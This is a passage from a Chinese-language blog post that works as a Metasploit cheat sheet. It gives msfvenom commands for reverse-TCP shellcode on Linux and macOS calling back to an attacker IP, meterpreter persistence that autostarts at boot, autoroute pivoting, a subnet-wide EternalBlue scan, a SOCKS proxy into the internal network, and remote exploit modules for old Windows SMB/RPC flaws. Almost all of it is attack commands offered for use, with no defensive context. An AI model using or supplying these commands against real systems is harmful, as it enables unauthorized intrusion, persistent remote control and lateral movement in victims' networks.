+<p><u>Linux Shellcode:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f c</span><br></pre></td></tr></table></figure>
+<p><u>Mac Shellcode:</u></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span> LPORT=<span class="number">8888</span> -f c</span><br></pre></td></tr></table></figure>
+<p><strong>0x07 常用技巧</strong></p>
+<p>1、长期维持权限①</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -A</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/metsvc_bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span></span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">31337</span> (默认)</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p>该条命令执行成功后，会在目标系统自动创建一个 meterpreter 的 serverces ，并自动保存为开机自动启动。</p>
+<p>2、长期维持权限②</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence –X –i <span class="number">50</span> –p <span class="number">8888</span> –r <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">226</span></span><br><span class="line"></span><br><span class="line">-A   自动启动一个匹配的exploit/multi/handler来连接到代理</span><br><span class="line">-L   如果未使用％TEMP％，则在目标主机中写入有效负载的位置。</span><br><span class="line">-P   有效负载使用，默认为windows/meterpreter/reverse_tcp。</span><br><span class="line">-S   作为服务自动启动代理程序（具有SYSTEM权限）</span><br><span class="line">-T   要使用的备用可执行模板</span><br><span class="line">-U   用户登录时自动启动代理</span><br><span class="line">-X   系统引导时自动启动代理程序</span><br><span class="line">-h   这个帮助菜单</span><br><span class="line">-i   每次连接尝试之间的时间间隔（秒）</span><br><span class="line">-p   运行Metasploit的系统正在侦听的端口</span><br><span class="line">-r   运行Metasploit监听连接的系统的IP</span><br></pre></td></tr></table></figure>
+<p>3、获取shell后，添加一层路由</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -h                  查看设置路由命令帮助</span><br><span class="line">meterpreter &gt; run get_local_subnets             获取当前设备路由链路</span><br><span class="line">meterpreter &gt; run autoroute -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">0</span>/<span class="number">24</span>   设置路由</span><br><span class="line">meterpreter &gt; run autoroute -p                  查看目前设置好的路由</span><br></pre></td></tr></table></figure>
+<p>4、批量扫局域网内永恒之蓝</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="built_in">set</span> rhosts <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line">rhosts =&gt; <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="built_in">set</span> threads <span class="number">50</span></span><br><span class="line">threads =&gt; <span class="number">50</span></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br></pre></td></tr></table></figure>
+<p>5、设置代理</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/server/socks4a</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; show options</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; <span class="built_in">set</span> srvport <span class="number">8888</span></span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job <span class="number">0</span>.</span><br><span class="line"></span><br><span class="line">[*] Starting the socks4a proxy server</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>. 打开浏览器代理设置</span><br><span class="line"><span class="number">2</span>. 设置Socks Host msf_IP，Port msf_8888</span><br><span class="line"><span class="number">3</span>. 选择Socks v4</span><br><span class="line"><span class="number">4</span>. 保存设置</span><br><span class="line"><span class="number">5</span>. 直接浏览器访问内网地址</span><br></pre></td></tr></table></figure>
+<p>6、常见远程攻击模块</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi     （MS08_067 Windows <span class="number">2</span>k，XP，<span class="number">2003</span>远程攻击）</span><br><span class="line">use exploit/windows/dcerpc/ms06_040_netapi  （MS06_040 Windows NT，<span class="number">2</span>k，XP，<span class="number">2003</span>远程攻击）</span><br><span class="line">use exploit/windows/smb/ms09_050_smb2_negotiate_func_index    （MS09_050 Windows Vista SP1 / SP2和Server <span class="number">2008</span>（x86）远程攻击）</span><br></pre></td></tr></table></figure>
+<p><strong>0x08 未完待续</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/命令备忘/">命令备忘</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/metasploit/">metasploit</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+	<a>不要因为走了太久而忘记当初为什么出发。</a>
+    <br>
+	<a>© 2019 shiyan</a>
+	<br>
+  </p>
+</footer>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_uv"> 
+<a>「</a>
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+<a>  」</a>
+</span>
+    
+  </div>
+</div>
+</body>
+</html>
